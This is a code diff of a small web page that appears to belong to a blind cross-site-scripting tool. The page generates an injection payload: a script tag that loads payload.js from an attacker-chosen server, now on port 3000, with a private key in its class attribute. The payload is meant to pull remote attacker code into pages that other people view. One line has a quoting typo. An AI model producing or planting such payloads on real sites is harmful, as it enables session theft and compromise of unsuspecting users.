@@ -7,14 +7,14 @@ function gen()
 {
  var pri = document.getElementById('pri');
  var ip = document.getElementById('ip');
- var payload = "<"+"script/id='hbxss' src='//"+ip.value+"/payload.js' class='"+pri.value+"'><"+"/script>";
- document.getElementById('payload').value=payload;
+ var payload = "<"+"script/id='hbxss' src='//"+ip.value+":3000/payload.js' class='"+pri.value+"'><"+"/script>";
+ document.getElementById('payload').innerHTML=payload;
 }
 </script>
 PRI KEY <input id="pri" type=text value="">
 SERVER DOMAIN <input id="ip" type=text value="">
 <input type=button value="GENERATE" onclick="gen()"><br>
-<input type="text" id="payload" value="" style="width=100%">
+<textarea type="text" id="payload" value="" style="width=503px;"></textarea>
 <script>document.getElementById(''ip).value=document.location</script>
 <hr>
 
